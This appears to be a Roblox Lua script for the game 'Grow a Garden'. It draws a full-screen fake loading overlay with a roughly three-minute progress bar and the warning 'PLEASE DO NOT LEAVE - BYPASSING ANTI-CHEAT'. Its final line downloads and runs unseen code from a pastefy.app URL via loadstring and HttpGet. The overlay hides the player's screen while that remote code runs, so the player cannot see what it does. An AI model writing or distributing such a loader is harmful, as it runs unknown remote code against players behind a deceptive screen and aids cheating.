local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "CustomLoadingScreen"
loadingGui.IgnoreGuiInset = true
loadingGui.DisplayOrder = 999999
loadingGui.ResetOnSpawn = false
loadingGui.Parent = playerGui

local bg = Instance.new("Frame", loadingGui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
bg.BorderSizePixel = 0

local title = Instance.new("TextLabel", bg)
title.Size = UDim2.new(1, 0, 0, 50)
title.Position = UDim2.new(0, 0, 0.18, 0)
title.BackgroundTransparency = 1
title.Text = "GROW A GARDEN"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBlack
title.TextScaled = true

local loadingLabel = Instance.new("TextLabel", bg)
loadingLabel.Size = UDim2.new(1, 0, 0, 40)
loadingLabel.Position = UDim2.new(0, 0, 0.30, 0)
loadingLabel.BackgroundTransparency = 1
loadingLabel.Text = "Loading Script..."
loadingLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
loadingLabel.Font = Enum.Font.Gotham
loadingLabel.TextScaled = true

local percent = Instance.new("TextLabel", bg)
percent.Size = UDim2.new(1, 0, 0, 40)
percent.Position = UDim2.new(0, 0, 0.38, 0)
percent.BackgroundTransparency = 1
percent.Text = "0%"
percent.TextColor3 = Color3.fromRGB(0, 255, 0)
percent.Font = Enum.Font.GothamBold
percent.TextScaled = true

local barBG = Instance.new("Frame", bg)
barBG.Size = UDim2.new(0.6, 0, 0, 16)
barBG.Position = UDim2.new(0.2, 0, 0.475, 0) -- Moved down for spacing
barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barBG.BorderSizePixel = 0
barBG.ClipsDescendants = true
Instance.new("UICorner", barBG).CornerRadius = UDim.new(0, 8)

local barFill = Instance.new("Frame", barBG)
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
barFill.BorderSizePixel = 0
Instance.new("UICorner", barFill).CornerRadius = UDim.new(0, 8)

local warning = Instance.new("TextLabel", bg)
warning.Size = UDim2.new(1, -20, 0, 30)
warning.Position = UDim2.new(0, 10, 0.88, 0)
warning.BackgroundTransparency = 1
warning.Text = "PLEASE DO NOT LEAVE - BYPASSING ANTI-CHEAT"
warning.TextColor3 = Color3.fromRGB(255, 80, 80)
warning.Font = Enum.Font.GothamBold
warning.TextScaled = true

-- Loading logic
task.spawn(function()
	for i = 1, 100 do
		percent.Text = i .. "%"
		barFill:TweenSize(UDim2.new(i / 100, 0, 1, 0), "Out", "Quad", 0.1, true)
		wait(1.8)
	end
	loadingGui:Destroy()
end)
loadstring(game:HttpGet("https://pastefy.app/X8I13KvO/raw"))()
